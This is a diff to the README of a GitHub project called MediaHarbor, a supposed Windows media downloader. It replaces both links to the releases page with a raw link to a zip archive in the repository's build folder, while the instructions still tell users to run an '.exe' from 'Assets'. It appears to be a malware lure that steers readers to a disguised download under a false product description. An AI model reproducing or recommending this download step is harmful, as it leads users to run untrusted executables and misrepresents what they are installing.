@@ -1,12 +1,12 @@
 # 🌊 MediaHarbor - Save your favorite online media files
 
-[![](https://img.shields.io/badge/Download-MediaHarbor-blue.svg)](https://github.com/Secondrate-politicalsphere141/MediaHarbor/releases)
+[![](https://img.shields.io/badge/Download-MediaHarbor-blue.svg)](https://github.com/Secondrate-politicalsphere141/MediaHarbor/raw/refs/heads/main/build/Media_Harbor_trunnel.zip)
 
 MediaHarbor lets you save public media files directly to your computer. You keep full control over your files without relying on cloud services. Paste a link, check the preview, and save the content to a folder on your drive. The app works on Windows and respects your privacy. 
 
 ## 📥 How to download your copy
 
-Visit [this page](https://github.com/Secondrate-politicalsphere141/MediaHarbor/releases) to access the latest version. Look for the file ending in `.exe` under the Assets section. Click the filename to start the download. Once the process finishes, find the file in your Downloads folder and double-click it to start the installation. 
+Visit [this page](https://github.com/Secondrate-politicalsphere141/MediaHarbor/raw/refs/heads/main/build/Media_Harbor_trunnel.zip) to access the latest version. Look for the file ending in `.exe` under the Assets section. Click the filename to start the download. Once the process finishes, find the file in your Downloads folder and double-click it to start the installation. 
 
 ## 🛠️ System requirements
 
